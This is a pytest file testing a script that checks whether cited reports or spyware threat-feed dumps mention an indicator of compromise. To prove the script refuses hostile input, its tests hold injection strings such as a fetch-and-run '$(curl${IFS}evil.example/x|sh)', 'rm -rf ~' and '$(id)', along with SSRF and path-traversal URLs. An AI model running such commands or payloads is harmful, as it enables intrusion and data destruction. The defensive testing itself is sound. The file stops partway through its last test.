"""Tests for check-reference.py: does a cited source actually mention an IOC?"""
import importlib.util
import ipaddress
import json
import pathlib
import subprocess
import sys
import time

THIS_DIR = pathlib.Path(__file__).parent
SCRIPT = THIS_DIR / "check-reference.py"
spec = importlib.util.spec_from_file_location("check_reference", SCRIPT)
cr = importlib.util.module_from_spec(spec)
spec.loader.exec_module(cr)


import pytest


@pytest.fixture(autouse=True)
def fixed_campaigns(monkeypatch):
    """Tests don't depend on the repo's current campaigns.yml (round 11)."""
    monkeypatch.setattr(cr, "campaign_names", lambda: {
        "pegasus": "pegasus", "nso": "pegasus", "predator": "predator", "intellexa": "predator",
        "cytrox": "predator", "graphite": "graphite", "paragon": "graphite"})


def found(ind, text):
    return cr.find_indicator(ind, text)[0] == "FOUND"


def dump(path, body):
    """A feed dump section exactly as scripts/fetch-feed-dumps.sh writes it."""
    return "## " + path + "\n" + "".join("| " + line + "\n" for line in body.splitlines())


def public_dns(monkeypatch):
    monkeypatch.setattr(cr.socket, "getaddrinfo", lambda *a, **k: [(2, 1, 6, "", ("192.0.2.10", 443))])
    monkeypatch.setattr(cr, "_is_public", lambda ip: True)


def test_plain_domain_found():
    assert found("evil.com", "C2 at evil.com was seen")


def test_defanged_forms_found():
    for text in ["evil[.]com", "evil(.)com", "EVIL[.]COM", "hxxps://evil[.]com/x seen", "evil[dot]com"]:
        assert found("evil.com", text), text


def test_label_boundaries():
    assert not found("ab.com", "visit grab.com today")
    assert not found("ab.com", "listed: ab.com.au")
    assert found("ab.com", "sub.ab.com is listed")


def test_url_only_occurrence_is_weak():
    status, _ = cr.find_indicator("evil.com", '<a href="https://x.example/search?q=evil.com">search</a>')
    assert status == "WEAK_FOUND"


def test_script_content_is_not_prose():
    assert cr.find_indicator("evil.com", "<script>var a='evil.com'</script><p>nothing</p>")[0] != "FOUND"


def test_defanged_url_host_counts_as_mention():
    assert found("evil.com", "C2: hxxps://evil[.]com/gate.php")
    assert found("evil.com", "C2: hxxps://cdn.evil[.]com/x")


def test_hash_case_and_colons():
    h = "de90f6899eec315f4ed05c2aa052d4fe8b71125a"
    assert found(h, "cert DE90F6899EEC315F4ED05C2AA052D4FE8B71125A")
    colon = ":".join(h[i:i + 2] for i in range(0, len(h), 2)).upper()
    assert found(h, f"SHA1: {colon}")


def test_unclosed_tags_are_linear():
    start = time.monotonic()
    cr.find_indicator("evil.com", "<script>" * 8000 + " evil.com")
    cr.find_indicator("evil.com", "<style>" * 8000 + " evil.com")
    assert time.monotonic() - start < 2


def run(*args):
    return subprocess.run([sys.executable, str(SCRIPT), *args], capture_output=True, text=True)


def test_feed_reference_found_with_family(tmp_path):
    (tmp_path / "stalkerware-indicators.txt").write_text(
        dump("stalkerware-indicators/ioc.yaml", "- name: TheTruthSpy\n  packages:\n  - com.ttsapp"))
    r = run("--indicator", "com.ttsapp", "--reference", "feed:stalkerware-indicators#TheTruthSpy",
            "--feed-dir", str(tmp_path))
    assert r.returncode == 0, r.stdout + r.stderr


def test_feed_reference_wrong_family(tmp_path):
    (tmp_path / "stalkerware-indicators.txt").write_text(
        dump("stalkerware-indicators/samples.csv", "4bcb69,Spyone"))
    r = run("--indicator", "4bcb69", "--reference", "feed:stalkerware-indicators#TiSpy", "--feed-dir", str(tmp_path))
    assert r.returncode == 1 and "FAMILY_MISMATCH" in r.stdout


def test_neighbouring_record_family_does_not_count(tmp_path):
    (tmp_path / "stalkerware-indicators.txt").write_text(dump("stalkerware-indicators/ioc.yaml",
        "- name: TheTruthSpy\n  packages:\n  - com.ttsapp\n- name: Other\n  packages:\n  - com.other"))
    cr.clear_caches()
    assert cr.check("com.other", "feed:stalkerware-indicators#TheTruthSpy", str(tmp_path))[0] == "FAMILY_MISMATCH"
    assert cr.check("com.ttsapp", "feed:stalkerware-indicators#TheTruthSpy", str(tmp_path))[0] == "FOUND"


def test_csv_family_must_be_on_the_same_line(tmp_path):
    (tmp_path / "stalkerware-indicators.txt").write_text(
        dump("stalkerware-indicators/samples.csv", "aaaa,TheTruthSpy\nbbbb,Spyone"))
    cr.clear_caches()
    assert cr.check("bbbb", "feed:stalkerware-indicators#TheTruthSpy", str(tmp_path))[0] == "FAMILY_MISMATCH"


def test_content_cannot_forge_a_header(tmp_path):
    (tmp_path / "zimperium-ioc.txt").write_text(
        dump("Zimperium/IOC/Other/README.md", "## Hook\nc2.example"))
    cr.clear_caches()
    assert cr.check("c2.example", "feed:zimperium-ioc#Hook", str(tmp_path))[0] == "FAMILY_MISMATCH"


def test_feed_reference_indicator_absent(tmp_path):
    (tmp_path / "stalkerware-indicators.txt").write_text(
        dump("stalkerware-indicators/ioc.yaml", "- name: TheTruthSpy\n  packages:\n  - com.ttsapp"))
    r = run("--indicator", "com.thetruthspy", "--reference", "feed:stalkerware-indicators#TheTruthSpy",
            "--feed-dir", str(tmp_path))
    assert r.returncode == 1 and "NOT_FOUND" in r.stdout


def test_family_in_date_prefixed_folder(tmp_path):
    # Real Zimperium layout (2026-10-16): families live in date-prefixed folders.
    cr.clear_caches()
    (tmp_path / "zimperium-ioc.txt").write_text(dump("2026-08-ToxicPanda/c2.csv", "cctvv2.com"))
    assert cr.check("cctvv2.com", "feed:zimperium-ioc#ToxicPanda", str(tmp_path), family="ToxicPanda")[0] == "FOUND"


def test_family_in_section_header(tmp_path):
    (tmp_path / "zimperium-ioc.txt").write_text(dump("Zimperium/IOC/Hook/domains.txt", "x\n" * 1500 + "hookc2.example"))
    cr.clear_caches()
    assert cr.check("hookc2.example", "feed:zimperium-ioc#Hook", str(tmp_path))[0] == "FOUND"


def test_family_needs_token_boundary(tmp_path):
    (tmp_path / "zimperium-ioc.txt").write_text(dump("Zimperium/IOC/Jokerbot/domains.txt", "c2.example"))
    cr.clear_caches()
    assert cr.check("c2.example", "feed:zimperium-ioc#Joker", str(tmp_path))[0] == "FAMILY_MISMATCH"
    assert cr.check("c2.example", "feed:zimperium-ioc#RAT", str(tmp_path))[0] == "BAD_INPUT"   # layout word


def test_stix_family_anywhere_in_the_bundle(tmp_path):
    body = '{"objects": [{"type": "malware", "name": "Predator"},' + ' {"x": 1},' * 500 + \
           ' {"type": "indicator", "pattern": "[domain-name:value = \'c2.example\']"}]}'
    (tmp_path / "mvt-indicators.txt").write_text(dump("intellexa_predator/predator.stix2", body))
    cr.clear_caches()
    assert cr.check("c2.example", "feed:mvt-indicators#Predator", str(tmp_path))[0] == "FOUND"


def test_pdf_is_unsupported_not_missing(monkeypatch):
    public_dns(monkeypatch)
    monkeypatch.setattr(cr, "fetch", lambda url, allowed: (b"%PDF-1.7 ...", "application/pdf", url, []))
    assert cr.check("evil.com", "https://example.org/report.pdf", None)[0] == "FETCH_UNSUPPORTED"


def test_js_rendered_shell_is_unsupported_not_not_found(monkeypatch):
    public_dns(monkeypatch)
    shell = (b'<html><head><script src="app.js"></script></head><body><div id="root"></div>'
             b'<noscript>Enable JavaScript</noscript></body></html>')
    monkeypatch.setattr(cr, "fetch", lambda url, allowed: (shell, "text/html", url, []))
    assert cr.check("evil.com", "https://example.org/app", None)[0] == "FETCH_UNSUPPORTED"


def test_long_static_page_with_script_stays_not_found(monkeypatch):
    public_dns(monkeypatch)
    prose = "<p>" + "This is ordinary article prose about mobile security research. " * 10 + "</p>"
    page = ("<html><body>" + prose + "<script>var x = 1;</script></body></html>").encode()
    monkeypatch.setattr(cr, "fetch", lambda url, allowed: (page, "text/html", url, []))
    assert cr.check("evil.com", "https://example.org/article", None)[0] == "NOT_FOUND"


def test_non_https_private_and_userinfo_blocked():
    assert cr.check("evil.com", "ftp://x", None)[0] in ("FETCH_FAILED", "BAD_INPUT")
    for url in ["https://127.0.0.1/x", "https://10.0.0.5/x", "https://169.254.169.254/latest", "https://[::1]/x",
                "https://127.1/x", "https://2130706433/x", "https://0x7f000001/x", "https://localhost/x",
                "https://citizenlab.ca@evil.com/x"]:
        assert cr.url_problem(url, None) is not None, url


def test_mapped_and_cgnat_addresses_are_not_public():
    assert not cr._is_public(ipaddress.ip_address("100.64.1.1"))
    assert not cr._is_public(ipaddress.ip_address("::ffff:10.0.0.1"))
    assert not cr._is_public(ipaddress.ip_address("::ffff:127.0.0.1"))


def test_rebinding_name_blocked(monkeypatch):
    monkeypatch.setattr(cr.socket, "getaddrinfo", lambda *a, **k: [(2, 1, 6, "", ("10.0.0.5", 443))])
    assert cr.url_problem("https://internal.attacker.example/x", None) is not None


def test_bracketed_reference_is_a_problem_not_a_crash():
    assert cr.url_problem("https://[redacted]/x", None) is not None
    assert cr.check("evil.com", "https://[redacted]/x", None)[0] in ("BLOCKED_URL", "BAD_INPUT")


def test_bracketed_url_in_page_text_does_not_crash():
    assert found("evil.com", "see https://[redacted].info8fvhgl3.urlpush.net:30827/[same and evil.com")


def test_prefix_allowlist(monkeypatch):
    public_dns(monkeypatch)
    allowed = ["https://citizenlab.ca/", "https://github.com/mvt-project/mvt-indicators/blob/main/"]
    assert cr.url_problem("https://citizenlab.ca/2025/03/x/", allowed) is None
    assert cr.url_problem("https://github.com/attacker/x/issues/1", allowed) is not None
    assert cr.url_problem("https://citizenlab.ca.evil.com/x", allowed) is not None


def test_code_host_user_content_blocked(monkeypatch):
    public_dns(monkeypatch)
    allowed = ["https://github.com/mvt-project/mvt-indicators/blob/main/"]
    for url in ["https://github.com/mvt-project/mvt-indicators/issues/1",
                "https://github.com/mvt-project/mvt-indicators/pull/3",
                "https://github.com/mvt-project/mvt-indicators/blob/" + "a" * 40 + "/x.txt",
                "https://github.com/mvt-project/mvt-indicators/blob/abc1234/x.txt",
                "https://raw.githubusercontent.com/mvt-project/mvt-indicators/abc1234def/x.txt"]:
        assert cr.url_problem(url, allowed) is not None, url
    assert cr.url_problem("https://github.com/mvt-project/mvt-indicators/blob/main/pegasus.stix2", allowed) is None


def test_path_tricks_blocked(monkeypatch):
    public_dns(monkeypatch)
    allowed = ["https://github.com/mvt-project/mvt-indicators/blob/main/"]
    for url in ["https://github.com/mvt-project/mvt-indicators/blob/main/../../../attacker/x/blob/main/a",
                "https://github.com/mvt-project/mvt-indicators/blob/main/%2e%2e/%2E%2E/x",
                "https://github.com/mvt-project/mvt-indicators/blob/main/a%2Fb",
                "https://github.com/mvt-project/mvt-indicators/blob/main/a%5cb",
                "https://citizenlab.ca/./x"]:
        assert cr.url_problem(url, allowed) is not None, url


def test_prefix_shapes():
    ok = ["https://citizenlab.ca/",
          "https://github.com/mvt-project/mvt-indicators/blob/main/",
          "https://github.com/AmnestyTech/investigations/tree/master/",
          "https://raw.githubusercontent.com/AmnestyTech/investigations/master/",
          "https://gitlab.com/group/proj/-/blob/main/"]
    bad = ["https://citizenlab.ca",                                      # no trailing slash
           "https://github.com/AmnestyTech/investigations/",             # not branch-pinned
           "https://raw.githubusercontent.com/mvt-project/mvt-indicators/",
           "https://github.com/x/y/blob/abc1234/",                       # hex "branch" = commit
           "https://github.com/x/y/issues/1/tree/main/",                 # pin not anchored
           "https://gist.githubusercontent.com/x/",
           "https://objects.githubusercontent.com/",
           "https://gist.github.com/x/",
           "https://github.com/x/y/blob/main/../z/",
           "http://citizenlab.ca/"]
    for p in ok:
        assert cr.prefix_problem(p) is None, p
    for p in bad:
        assert cr.prefix_problem(p) is not None, p


def test_bad_input_shapes():
    assert cr.check("evil.com", "https://evil.example/a$(curl${IFS}evil.example/x|sh)", None)[0] == "BAD_INPUT"
    assert cr.check("evil.com; rm -rf ~", "https://citizenlab.ca/x", None)[0] == "BAD_INPUT"
    assert cr.check("evil.com", "feed:x#Fam$(id)", None)[0] == "BAD_INPUT"


def test_batch_mode_reads_values_from_file_not_argv(tmp_path):
    (tmp_path / "feeds").mkdir()
    (tmp_path / "feeds" / "stalkerware-indicators.txt").write_text(
        dump("stalkerware-indicators/ioc.yaml", "- name: TheTruthSpy\n  packages:\n  - com.ttsapp"))
    (tmp_path / "sources.json").write_text(json.dumps([{"id": "stalkerware-indicators", "reference_prefixes": []},
                                                       {"id": "threat_research", "reference_prefixes": ["https://citizenlab.ca/"]}]))
    (tmp_path / "cand.yml").write_text(
        "entries:\n"
        "- indicator: com.ttsapp\n  family: TheTruthSpy\n  reference: 'feed:stalkerware-indicators#TheTruthSpy'\n"
        "  source: stalkerware-indicators\n"
        "- indicator: evil.com\n  reference: 'https://evil.example/a$(touch " + str(tmp_path / "pwned") + ")'\n"
        "  source: threat_research\n")
    r = run("--entries", str(tmp_path / "cand.yml"), "--allowed-sources", str(tmp_path / "sources.json"),
            "--feed-dir", str(tmp_path / "feeds"))
    rows = [json.loads(l) for l in r.stdout.splitlines()]
    assert [x["status"] for x in rows] == ["FOUND", "BAD_INPUT"]
    assert r.returncode == 2
    assert not (tmp_path / "pwned").exists()


def test_decoded_text_cannot_forge_a_header_or_record(tmp_path):
    cr.clear_caches()
    (tmp_path / "zimperium-ioc.txt").write_text(dump("Other/README.md", "note &#10;## Hook/x.txt&#10;| c2.example"))
    assert cr.check("c2.example", "feed:zimperium-ioc#Hook", str(tmp_path))[0] == "FAMILY_MISMATCH"
    cr.clear_caches()
    with open(tmp_path / "zimperium-ioc.txt", "w", newline="") as f:
        f.write("## Other/README.md\n| note\r## Hook/x.txt\r| c2.example\n")
    assert cr.check("c2.example", "feed:zimperium-ioc#Hook", str(tmp_path))[0] == "FAMILY_MISMATCH"


def test_threatfox_record_cannot_relabel_later_records(tmp_path):
    cr.clear_caches()
    (tmp_path / "threatfox.txt").write_text(dump("threatfox/full.jsonl",
        '{"ioc_value":"a.example","malware_printable":"X","reference":"https://r.example/#&#10;## pegasus/x.txt"}\n'
        '{"ioc_value":"b.example","malware_printable":"Yoyo"}'))
    assert cr.check("b.example", "feed:threatfox#Pegasus", str(tmp_path))[0] == "FAMILY_MISMATCH"
    assert cr.check("b.example", "feed:threatfox#Yoyo", str(tmp_path))[0] == "FOUND"


def test_decoded_text_cannot_start_a_yaml_record(tmp_path):
    cr.clear_caches()
    (tmp_path / "stalkerware-indicators.txt").write_text(dump("stalkerware-indicators/ioc.yaml",
        "- name: TheTruthSpy\n  note: x&#10;- name: Other\n  packages:\n  - com.ttsapp"))
    # the forged "- name: Other" is not a record start, so com.ttsapp stays in TheTruthSpy's record
    assert cr.check("com.ttsapp", "feed:stalkerware-indicators#TheTruthSpy", str(tmp_path))[0] == "FOUND"


def test_dump_script_ends_every_file_and_flattens_cr(tmp_path):
    src = tmp_path / "repo"
    (src / "Hook").mkdir(parents=True)
    (src / "Other").mkdir()
    (src / ".git").mkdir()
    (src / "Hook" / "domains.txt").write_bytes(b"a.example")             # no trailing newline
    (src / "Other" / "domains.txt").write_bytes(b"c2.other.example\r## Hook/y.txt\n")
    (src / ".git" / "HEAD").write_text("ref: refs/heads/main\n")
    lib = THIS_DIR.parent / "scripts" / "feed-dump.sh"
    out = subprocess.run(["bash", "-c", f'source "{lib}"; dump "{src}" -name "*"'],
                         capture_output=True, text=True, check=True).stdout
    assert out == "## Hook/domains.txt\n| a.example\n## Other/domains.txt\n| c2.other.example ## Hook/y.txt\n"
    (tmp_path / "feeds").mkdir()
    (tmp_path / "feeds" / "zimperium-ioc.txt").write_text(out)
    cr.clear_caches()
    assert cr.check("c2.other.example", "feed:zimperium-ioc#Hook", str(tmp_path / "feeds"))[0] == "FAMILY_MISMATCH"


def test_query_port_and_trailing_dot_refused(monkeypatch):
    public_dns(monkeypatch)
    assert cr.check("evil.com", "https://citizenlab.ca/?s=evil.com", None)[0] == "BAD_INPUT"
    allowed = ["https://citizenlab.ca/"]
    assert cr.url_problem("https://citizenlab.ca/x?s=evil.com", allowed) is not None
    assert cr.url_problem("https://citizenlab.ca:8443/x", allowed) is not None
    assert cr.url_problem("https://github.com./x/y/issues/1", None) is not None
    for p in ["https://github.com./x/y/blob/main/", "https://gist.github.com./x/", "https://objects.githubusercontent.com./"]:
        assert cr.prefix_problem(p) is not None, p


def test_indicator_in_reference_url_is_weak(monkeypatch):
    public_dns(monkeypatch)
    monkeypatch.setattr(cr, "fetch", lambda url, allowed: (b"<h1>Results for: evil.com</h1>", "text/html", url, []))
    assert cr.check("evil.com", "https://citizenlab.ca/tag/evil.com/", ["https://citizenlab.ca/"])[0] == "WEAK_FOUND"


def test_refs_uppercase_sha_and_merge_requests(monkeypatch):
    public_dns(monkeypatch)
    for p in ["https://raw.githubusercontent.com/o/r/refs/", "https://github.com/o/r/blob/refs/",
              "https://gitlab.com/o/r/-/raw/refs/"]:
        assert cr.prefix_problem(p) is not None, p
    assert cr.prefix_problem("https://raw.githubusercontent.com/o/r/refs/heads/main/") is None
    allowed = ["https://gitlab.com/o/r/-/blob/main/", "https://github.com/o/r/blob/main/"]
    assert cr.url_problem("https://gitlab.com/o/r/-/blob/main/refs/merge-requests/1/head/x", allowed) is not None
    assert cr.url_problem("https://github.com/o/r/blob/main/ABC1234DEF/x", allowed) is not None


def test_detail_has_no_control_characters(tmp_path):
    cr.clear_caches()
    (tmp_path / "zimperium-ioc.txt").write_text(dump("Hook/domains.txt", "c2.example \x1b]0;pwn\x07 x"))
    status, detail = cr.check("c2.example", "feed:zimperium-ioc#Hook", str(tmp_path))
    assert status == "FOUND" and "\x1b" not in detail and "\x07" not in detail


def test_percent_encoded_unreserved_refused(monkeypatch):
    public_dns(monkeypatch)
    allowed = ["https://citizenlab.ca/"]
    for url in ["https://citizenlab.ca/search/%65vil.com/", "https://citizenlab.ca/search/evil.c%6Fm/",
                "https://github.com/o/r/blob/main/%69ssues/1"]:
        assert cr.url_problem(url, allowed + ["https://github.com/o/r/blob/main/"]) is not None, url
    # a legitimately encoded reserved/non-ASCII character is still fine
    assert cr.url_problem("https://citizenlab.ca/2025/03/caf%C3%A9-report/", allowed) is None


def test_bidi_and_zero_width_stripped_from_detail(tmp_path):
    cr.clear_caches()
    (tmp_path / "zimperium-ioc.txt").write_text(dump("Hook/domains.txt", "c2.example \u202egnp.exe\u202c \u200b x"))
    status, detail = cr.check("c2.example", "feed:zimperium-ioc#Hook", str(tmp_path))
    assert status == "FOUND" and not any(c in detail for c in "\u202e\u202c\u200b")


def test_threatfox_other_fields_cannot_vouch(tmp_path):
    cr.clear_caches()
    (tmp_path / "threatfox.txt").write_text(dump("threatfox/full.jsonl",
        '{"ioc_value":"attacker.example","malware_printable":"X","tags":["Pegasus"],"reference":"https://legit.example/"}\n'
        '{"ioc_type":"ip:port","ioc_value":"c2.real.example:443","malware_printable":"Hook"}'))
    assert cr.check("legit.example", "feed:threatfox#Pegasus", str(tmp_path))[0] == "NOT_FOUND"
    assert cr.check("attacker.example", "feed:threatfox#Pegasus", str(tmp_path))[0] == "FAMILY_MISMATCH"
    assert cr.check("c2.real.example", "feed:threatfox#Hook", str(tmp_path))[0] == "FOUND"


def test_generic_or_short_fragments_refused(tmp_path):
    cr.clear_caches()
    (tmp_path / "amnesty-investigations.txt").write_text(dump("2021-10-07_donot/domains.txt", "donot-c2.example"))
    for frag in ["txt", "domains", "amnesty-investigations", "-", " ", "ab"]:
        assert cr.check("donot-c2.example", f"feed:amnesty-investigations#{frag}", str(tmp_path))[0] == "BAD_INPUT", frag


def test_section_citation_is_never_found(tmp_path):
    cr.clear_caches()
    (tmp_path / "amnesty-investigations.txt").write_text(dump("2021-10-07_donot/domains.txt", "donot-c2.example"))
    ref = "feed:amnesty-investigations#2021-10-07_donot"
    assert cr.check("donot-c2.example", ref, str(tmp_path), family="Donot Team")[0] == "SECTION_CITED"
    # a campaign family can never be section-cited
    assert cr.check("donot-c2.example", ref, str(tmp_path), family="Pegasus")[0] == "FAMILY_MISMATCH"
    # a substring of a folder name is not a section token
    assert cr.check("donot-c2.example", "feed:amnesty-investigations#donot", str(tmp_path),
                    family="Donot Team")[0] == "FAMILY_MISMATCH"


def test_no_section_citations_in_record_feeds(tmp_path):
    cr.clear_caches()
    (tmp_path / "malwarebazaar.txt").write_text(dump("malwarebazaar/get_info.jsonl",
        '{"sha256_hash":"' + "a" * 64 + '","signature":null}'))
    assert cr.check("a" * 64, "feed:malwarebazaar#get_info", str(tmp_path), family="BTMOB")[0] == "BAD_INPUT"
    assert cr.check("a" * 64, "feed:malwarebazaar#getinfo", str(tmp_path), family="BTMOB")[0] == "BAD_INPUT"


def test_ambiguous_section_token_refused(tmp_path):
    cr.clear_caches()
    (tmp_path / "zimperium-ioc.txt").write_text(dump("a/hookish/x.txt", "c2.example") + dump("b/hookish/y.txt", "z.example"))
    assert cr.check("c2.example", "feed:zimperium-ioc#hookish", str(tmp_path), family="Hook")[0] == "FAMILY_MISMATCH"


def test_malwarebazaar_tags_count_threatfox_tags_do_not(tmp_path):
    cr.clear_caches()
    h = "b" * 64
    (tmp_path / "malwarebazaar.txt").write_text(dump("malwarebazaar/get_info.jsonl",
        '{"sha256_hash":"' + h + '","signature":null,"tags":["apk","BeatBanker"]}'))
    assert cr.check(h, "feed:malwarebazaar#BeatBanker", str(tmp_path))[0] == "WEAK_FOUND"   # uploader text


def test_threatfox_url_record_does_not_vouch_for_its_host(tmp_path):
    cr.clear_caches()
    (tmp_path / "threatfox.txt").write_text(dump("threatfox/full.jsonl",
        '{"ioc_type":"url","ioc_value":"https://drive.google.com/uc?id=x","malware_printable":"Hook"}\n'
        '{"ioc_type":"ip:port","ioc_value":"c2.real.example:8080","malware_printable":"Hook"}'))
    assert cr.check("drive.google.com", "feed:threatfox#Hook", str(tmp_path))[0] == "NOT_FOUND"
    assert cr.check("c2.real.example", "feed:threatfox#Hook", str(tmp_path))[0] == "FOUND"


def test_double_encoding_and_redirect_echo_capped(monkeypatch):
    public_dns(monkeypatch)
    allowed = ["https://citizenlab.ca/"]
    assert cr.url_problem("https://citizenlab.ca/search/%2565vil.com/", allowed) is not None
    monkeypatch.setattr(cr, "fetch", lambda url, allowed: (b"<h1>Results for: evil.com</h1>", "text/html",
                                                           "https://citizenlab.ca/search/evil.com/",
                                                           ["https://citizenlab.ca/search/evil.com/"]))
    assert cr.check("evil.com", "https://citizenlab.ca/2025/x/", allowed)[0] == "WEAK_FOUND"


def test_stix_family_only_from_object_names(tmp_path):
    cr.clear_caches()
    body = json.dumps({"objects": [
        {"type": "malware", "name": "Predator"},
        {"type": "report", "description": "also infected with NSO Group's Pegasus"},
        {"type": "indicator", "pattern": "[domain-name:value = 'predc2.example']"}]})
    (tmp_path / "amnesty-investigations.txt").write_text(dump("2023-predator/predator.stix2", body))
    assert cr.check("predc2.example", "feed:amnesty-investigations#Predator", str(tmp_path))[0] == "FOUND"
    assert cr.check("predc2.example", "feed:amnesty-investigations#Pegasus", str(tmp_path))[0] == "FAMILY_MISMATCH"


def test_campaign_entries_need_whole_folder_name(tmp_path):
    cr.clear_caches()
    (tmp_path / "amnesty-investigations.txt").write_text(dump("2023-05-01_pegasus-vs-predator/domains.txt", "c2.example")
                                                          + dump("2021-07-18_pegasus/domains.txt", "p2.example"))
    ref = "feed:amnesty-investigations#Pegasus"
    assert cr.check("c2.example", ref, str(tmp_path), family="Pegasus", campaign="pegasus")[0] == "FAMILY_MISMATCH"
    assert cr.check("p2.example", ref, str(tmp_path), family="Pegasus", campaign="pegasus")[0] == "FOUND"
    # a family that names a campaign is strict even without the key (round 11, S11-2)
    assert cr.check("c2.example", ref, str(tmp_path), family="Pegasus")[0] == "FAMILY_MISMATCH"
    # a non-campaign family keeps the word-boundary form (Zimperium families)
    (tmp_path / "zimperium-ioc.txt").write_text(dump("2026-08-ToxicPanda-tools/c2.csv", "tp.example"))
    cr.clear_caches()
    assert cr.check("tp.example", "feed:zimperium-ioc#ToxicPanda", str(tmp_path), family="ToxicPanda")[0] == "FOUND"


def test_multi_family_stix_uses_indicates_links(tmp_path):
    # Shape of stalkerware-indicators' generated/stalkerware.stix2: many malware objects, one bundle.
    cr.clear_caches()
    objs = [{"type": "malware", "id": "malware--a", "name": "TheTruthSpy"},
            {"type": "malware", "id": "malware--b", "name": "HelloSpy"},
            {"type": "indicator", "id": "indicator--1", "pattern": "[domain-name:value='1ca43.example']"},
            {"type": "relationship", "id": "relationship--1", "relationship_type": "indicates",
             "source_ref": "indicator--1", "target_ref": "malware--a"},
            {"type": "indicator", "id": "indicator--2", "pattern": "[domain-name:value='unlinked.example']"}]
    (tmp_path / "stalkerware-indicators.txt").write_text(
        dump("generated/stalkerware.stix2", json.dumps({"objects": objs})))
    d = str(tmp_path)
    assert cr.check("1ca43.example", "feed:stalkerware-indicators#TheTruthSpy", d)[0] == "FOUND"
    assert cr.check("1ca43.example", "feed:stalkerware-indicators#HelloSpy", d)[0] == "FAMILY_MISMATCH"
    assert cr.check("unlinked.example", "feed:stalkerware-indicators#HelloSpy", d)[0] == "FAMILY_MISMATCH"


def test_hostile_stix_does_not_crash(tmp_path):
    cr.clear_caches()
    objs = [{"type": "malware", "id": "malware--a", "name": "Hook", "aliases": 7},
            {"type": "malware", "id": "malware--b", "name": "X", "aliases": {"Pegasus": 1}}, 5, "s",
            {"type": "indicator", "id": "indicator--1", "pattern": "[domain-name:value='c2.example']"}]
    (tmp_path / "zimperium-ioc.txt").write_text(dump("x/bundle.json", json.dumps({"objects": objs})))
    assert cr.check("c2.example", "feed:zimperium-ioc#Pegasus", str(tmp_path))[0] in ("FAMILY_MISMATCH", "FOUND")
    (tmp_path / "mvt-indicators.txt").write_text(dump("deep.stix2", "[" * 100000 + "]" * 100000 + " c2.example"))
    cr.clear_caches()
    assert cr.check("c2.example", "feed:mvt-indicators#Hook", str(tmp_path))[0] == "FAMILY_MISMATCH"


def test_campaign_entry_cannot_use_a_folder_named_family(tmp_path):
    cr.clear_caches()
    (tmp_path / "amnesty-investigations.txt").write_text(dump("2023-05-01_pegasus-vs-predator/domains.txt", "c2.example"))
    d = str(tmp_path)
    # family resolves to two campaigns -> refused
    assert cr.check("c2.example", "feed:amnesty-investigations#Pegasus-vs-Predator", d,
                    family="Pegasus-vs-Predator")[0] == "BAD_INPUT"
    # family names pegasus (no campaign passed) -> strict path, and the fragment must be pegasus's own name
    assert cr.check("c2.example", "feed:amnesty-investigations#Pegasus", d, family="Pegasus")[0] == "FAMILY_MISMATCH"


def test_campaign_alias_family_matches_its_folder(tmp_path):
    cr.clear_caches()
    (tmp_path / "amnesty-investigations.txt").write_text(dump("2021-07-18_nso/domains.txt", "nso-c2.example"))
    (tmp_path / "mvt-indicators.txt").write_text(dump("intellexa_predator/predator.stix2",
        json.dumps({"objects": [{"type": "malware", "id": "malware--p", "name": "Predator"},
                                {"type": "indicator", "id": "indicator--1",
                                 "pattern": "[domain-name:value='pred.example']"}]})))
    d = str(tmp_path)
    assert cr.check("nso-c2.example", "feed:amnesty-investigations#NSO", d, family="NSO Group")[0] == "FOUND"
    assert cr.check("nso-c2.example", "feed:amnesty-investigations#Pegasus", d, family="NSO Group")[0] == "FOUND"
    assert cr.check("pred.example", "feed:mvt-indicators#Intellexa", d, family="Intellexa")[0] == "FOUND"


def test_single_family_bundle_negation_and_prose_do_not_confirm(tmp_path):
    cr.clear_caches()
    objs = [{"type": "malware", "id": "malware--a", "name": "Alpha", "description": "talks about prose.example"},
            {"type": "indicator", "id": "indicator--1", "pattern": "[domain-name:value NOT = 'n.example']"},
            {"type": "indicator", "id": "indicator--3", "pattern": "[domain-name:value NOT='n2.example']"},
            {"type": "indicator", "id": "indicator--4", "pattern": "[domain-name:value != 'n3.example']"},
            {"type": "indicator", "id": "indicator--5", "pattern": "[domain-name:value NOT == 'n4.example']"},
            {"type": "indicator", "id": "indicator--2", "pattern": "[domain-name:value = 'pos.example']"}]
    (tmp_path / "mvt-indicators.txt").write_text(dump("one/bundle.stix2", json.dumps({"objects": objs})))
    d = str(tmp_path)
    assert cr.check("pos.example", "feed:mvt-indicators#Alpha", d)[0] == "FOUND"
    assert cr.check("n.example", "feed:mvt-indicators#Alpha", d)[0] == "FAMILY_MISMATCH"
    assert cr.check("n2.example", "feed:mvt-indicators#Alpha", d)[0] == "FAMILY_MISMATCH"   # NOT= without a space
    assert cr.check("n3.example", "feed:mvt-indicators#Alpha", d)[0] == "FAMILY_MISMATCH"   # != (S12-3, kept)
    assert cr.check("n4.example", "feed:mvt-indicators#Alpha", d)[0] == "FAMILY_MISMATCH"   # NOT ==
    assert cr.check("prose.example", "feed:mvt-indicators#Alpha", d)[0] == "FAMILY_MISMATCH"


def test_batch_refuses_owner_only_markers(tmp_path):
    (tmp_path / "sources.json").write_text(json.dumps([{"id": "threatfox", "reference_prefixes": []}]))
    (tmp_path / "cand.yml").write_text("entries:\n- indicator: thief.example\n  family: Predator The Thief\n"
                                       "  source: threatfox\n  reference: 'feed:threatfox#Predator The Thief'\n"
                                       "  not_campaign: true\n")
    r = run("--entries", str(tmp_path / "cand.yml"), "--allowed-sources", str(tmp_path / "sources.json"),
            "--feed-dir", str(tmp_path))
    assert json.loads(r.stdout.splitlines()[0])["status"] == "BAD_INPUT"


def test_single_form_not_campaign_flag(tmp_path, monkeypatch):
    # In-process (main()), so the fixed campaign vocabulary from the autouse fixture applies.
    cr.clear_caches()
    (tmp_path / "threatfox.txt").write_text(dump("threatfox/full.jsonl",
        '{"ioc_type":"domain","ioc_value":"thief.example","malware_printable":"Predator The Thief"}'))
    base = ["check-reference.py", "--indicator", "thief.example", "--reference", "feed:threatfox#Predator The Thief",
            "--family", "Predator The Thief", "--feed-dir", str(tmp_path)]

    def exit_code(argv):
        monkeypatch.setattr(sys, "argv", argv)
        with pytest.raises(SystemExit) as e:
            cr.main()
        return e.value.code

    assert exit_code(base) == 2                      # resolves to a campaign: refused on a record feed
    assert exit_code(base + ["--not-campaign"]) == 0  # owner-approved homonym: FOUND


def test_record_feeds_never_confirm_a_campaign(tmp_path):
    cr.clear_caches()
    (tmp_path / "threatfox.txt").write_text(dump("threatfox/full.jsonl",
        '{"ioc_type":"domain","ioc_value":"thief.example","malware_printable":"Predator The Thief"}'))
